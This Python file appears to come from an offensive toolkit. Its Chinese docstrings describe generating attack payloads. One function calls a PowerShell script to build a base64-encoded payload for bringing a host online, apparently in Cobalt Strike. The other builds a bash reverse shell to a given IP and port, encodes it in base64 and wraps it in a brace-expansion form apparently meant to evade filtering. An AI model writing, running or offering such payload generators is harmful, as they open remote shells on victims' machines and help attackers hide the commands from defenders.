import base64
import subprocess


def powershell_bs64(cs):
    '''生成powershell上线cs的payload
    使用powershell内置的base64编码上线cs的payload
    '''
    try:
        args = [r"powershell.exe", "./function/base64.ps1",cs]
        p = subprocess.Popen(args, stdout=subprocess.PIPE)
        payload = p.stdout.read()
        payload = payload.decode('utf-8').strip('\r\n')
        return payload
    except Exception as e:
        print(e)


def bash_bs64(ip, port):
    '''生成bash反弹shell的payload
    使用base64编码反弹shell命令
    '''
    try:
        cmd = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(ip, port)
        bs64 = base64.b64encode(cmd.encode('utf-8'))
        bs64 = bs64.decode('utf-8')
        payload = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % (bs64)
        return payload
    except Exception as e:
        print(e)